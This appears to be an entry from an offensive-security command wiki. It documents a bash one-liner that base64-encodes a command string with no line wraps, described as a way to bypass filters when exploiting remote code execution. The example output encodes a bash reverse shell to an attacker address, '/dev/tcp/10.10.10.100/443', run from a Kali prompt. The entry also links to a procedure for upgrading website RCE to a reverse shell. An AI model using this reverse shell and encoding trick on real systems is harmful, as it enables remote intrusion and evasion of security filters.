---
id: f8825d15-7fd0-4657-bd80-fa7958917d81
name: base64-encode-a-command
type: command
executor: bash
data: echo -n "$_COMMAND" | base64 -w 0
output: |-
  root@kali:~# echo -n 'bash -i >& /dev/tcp/10.10.10.100/443 0>&1' | base64 -w 0
  YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE=
created_at: '2019-12-05T03:01:00.083896+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - encoding
  - bypass
verified: true
validated: true
---

# base64-encode-a-command

## Command

```bash
echo -n "$_COMMAND" | base64 -w 0
```

## Description

Base64 encodes a command string without line wraps for RCE bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| echo -n | No newline | Yes |
| "$_COMMAND" | Command to encode | Yes |
| base64 -w 0 | Encode without wraps | Yes |

## Examples

### Encode Shell

```bash
echo -n 'id' | base64
```

## Expected Output

Encoded string like YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMDAvNDQzIDA+JjE=.

## Related

- [[procedures/upgrade-website-rce-to-reverse-shell-on-linux]]
